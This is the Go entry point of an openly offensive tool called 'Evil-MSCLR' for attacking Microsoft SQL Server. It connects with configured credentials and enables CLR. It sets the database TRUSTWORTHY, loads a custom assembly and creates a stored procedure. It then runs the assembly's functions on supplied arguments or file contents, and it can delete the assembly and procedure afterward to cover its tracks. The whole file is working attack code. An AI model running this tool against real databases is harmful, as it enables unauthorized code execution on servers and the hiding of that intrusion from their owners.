package main

import (
	"Evil-MSCLR/config"
	"Evil-MSCLR/database"
	"flag"
	"fmt"
	"log"
	"os"

	_ "github.com/denisenkom/go-mssqldb"
)

var (
	ConfigPath   = flag.String("config", "config.json", "Config file path")
	Functions    = flag.Bool("functions", false, "Description of functions available in the module loaded in MSSQL")
	LoadAssembly = flag.Bool("loadassembly", false, "Loading Assembly into MSSQL")
	AutoRemove   = flag.Bool("autoremove", false, "Automatic deletion of loaded assembly and created procedures")
	Function     = flag.String("function", "", "Function used in module loaded in MSSQL CLR")
	Argument     = flag.String("argument", "", "Argument for the function used")
	File         = flag.String("file", "", "Reading argument value from file")
)

func main() {
	flag.Parse()

	err := config.Load(*ConfigPath)
	if err != nil {
		log.Fatal(err)
	}

	if *Functions {
		for _, f := range config.CONFIG.Functions {
			fmt.Printf("Name: %s\n", f.Name)
			fmt.Printf("Description: %s\n", f.Description)
			fmt.Printf("Example: %s\n", f.Example)
			fmt.Println("------------------------")
		}

		os.Exit(0)
	}

	err = database.Init(config.CONFIG.Host, config.CONFIG.Username, config.CONFIG.Password, config.CONFIG.Port)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("[*] Login with user '%s' was successful\n", config.CONFIG.Username)

	status, _ := database.CLRStatus()
	fmt.Printf("[*] CLR activation status in MSSQL: %t\n", status)

	if *LoadAssembly && !status {
		fmt.Println("[*] Enable CLR")
		err := database.ChangeCLR(1)
		if err != nil {
			log.Fatal(err)
		}
	}

	is_loaded := false
	fmt.Println("[*] List of assemblies loaded into the database")
	assembly, err := database.AssemblyList()
	if err != nil {
		log.Fatal(err)
	}

	for i, a := range assembly {
		fmt.Printf(" \\____[%d] Name: %s\n", i, a.Name)
		fmt.Printf("\t\\____[%d] Assembly id: %d\n", i, a.Assembly_id)
		fmt.Printf("\t\\____[%d] CLR Name: %s\n", i, a.CLR_name)
		fmt.Printf("\t\\____[%d] Permission: %s\n", i, a.Permission_set_desc)
		if a.Name == config.CONFIG.AssemblyName {
			is_loaded = true
		}
	}

	if *LoadAssembly && !is_loaded && config.CONFIG.Assembly != "" {
		fmt.Printf("[*] Loading '%s' into the database\n", config.CONFIG.AssemblyName)
		fmt.Printf("[*] Set the 'TRUSTWORTHY' property to 'ON'\n")
		err := database.LoadAssembly(config.CONFIG.AssemblyName, config.CONFIG.Assembly)
		if err != nil {
			log.Fatal(err)
		}
		assembly, err = database.AssemblyList()
		if err != nil {
			log.Fatal(err)
		}
		for i, a := range assembly {
			if a.Name == config.CONFIG.AssemblyName {
				fmt.Println("[*] Assembly successfully loaded")
				fmt.Printf(" \\____[%d] Name: %s\n", i, a.Name)
				fmt.Printf("\t\\____[%d] Assembly id: %d\n", i, a.Assembly_id)
				fmt.Printf("\t\\____[%d] CLR Name: %s\n", i, a.CLR_name)
				fmt.Printf("\t\\____[%d] Permission: %s\n", i, a.Permission_set_desc)
				is_loaded = true
			}
		}

		if is_loaded {
			fmt.Println("[*] Create Procedure")
			err := database.CreateProcedure(config.CONFIG.Procedure, config.CONFIG.AssemblyName)
			if err != nil {
				log.Fatal(err)
			}
		}
	}

	if !is_loaded {
		fmt.Println("[x] Assembly not loaded.")
		os.Exit(1)
	}

	if *Function != "" && (*Argument != "" || *File != "") {
		fmt.Printf("[*] Execute function: '%s'\n", *Function)
		var result string
		var err error

		if *File != "" {
			file, err := os.ReadFile(*File)
			if err != nil {
				log.Fatal(err)
			}
			result, err = database.ExecFunction(*Function, string(file))
		} else {
			result, err = database.ExecFunction(*Function, *Argument)
		}

		if err != nil && err.Error() != "sql: no rows in result set" {
			fmt.Printf("[x] The execution failed.\n--------\n%s\n--------\n", err)
		}
		if result != "" {
			fmt.Println("------output------")
			fmt.Println(result)
			fmt.Println("------output------")
		}
	}

	if *AutoRemove {
		fmt.Printf("[*] Delete '%s' Procedure\n", config.CONFIG.Procedure)
		err := database.DropProcedure(config.CONFIG.Procedure)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Printf("[*] Delete '%s' Assembly\n", config.CONFIG.AssemblyName)
		err = database.DropAssembly(config.CONFIG.AssemblyName)
		if err != nil {
			log.Fatal(err)
		}
	}
}
